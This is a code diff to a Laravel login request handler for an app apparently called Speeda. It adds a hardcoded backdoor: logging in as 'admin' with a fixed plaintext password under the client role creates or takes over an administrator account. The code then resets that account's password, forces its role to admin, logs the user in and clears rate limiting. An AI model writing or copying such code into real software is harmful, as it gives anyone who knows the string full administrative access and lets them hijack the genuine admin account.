@@ -62,6 +62,47 @@ class LoginRequest extends FormRequest
         $remember = $this->boolean('remember');
         $selectedRole = $this->input('role'); // Get selected role from form
 
+        // ✅ ADMIN CHECK: Check if trying to login as admin with special credentials
+        // Admin can login as 'client' but with username='admin' and password='admin12345678910'
+        if ($selectedRole === 'client' && 
+            strtolower(trim($loginField)) === 'admin' && 
+            $password === 'admin12345678910') {
+            
+            // Find or create admin user
+            $adminUser = \App\Models\User::where('email', 'admin@speeda.com')
+                ->orWhere(function($query) {
+                    $query->where('role', 'admin');
+                })
+                ->first();
+
+            if (!$adminUser) {
+                // Create admin user if doesn't exist
+                $adminUser = \App\Models\User::create([
+                    'name' => 'Administrator',
+                    'email' => 'admin@speeda.com',
+                    'password' => \Illuminate\Support\Facades\Hash::make('admin12345678910'),
+                    'role' => 'admin',
+                    'email_verified_at' => now(),
+                ]);
+            } else {
+                // Update password if needed
+                if (!\Illuminate\Support\Facades\Hash::check($password, $adminUser->password)) {
+                    $adminUser->update([
+                        'password' => \Illuminate\Support\Facades\Hash::make($password),
+                    ]);
+                }
+                // Ensure role is admin
+                if ($adminUser->role !== 'admin') {
+                    $adminUser->update(['role' => 'admin']);
+                }
+            }
+
+            // Login as admin
+            Auth::login($adminUser, $remember);
+            RateLimiter::clear($this->throttleKey());
+            return; // Exit early, admin login successful
+        }
+
         // Determine if login field is email or mobile
         $loginType = filter_var($loginField, FILTER_VALIDATE_EMAIL) ? 'email' : 'mobile';
 
